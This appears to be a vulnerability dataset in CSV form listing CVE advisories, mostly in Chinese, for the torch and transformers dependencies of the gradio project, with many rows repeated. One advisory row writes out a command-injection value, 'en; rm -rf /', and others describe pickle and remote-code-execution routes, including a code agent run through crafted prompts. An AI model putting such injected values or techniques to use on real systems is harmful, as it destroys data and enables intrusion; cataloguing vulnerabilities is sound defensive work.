gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
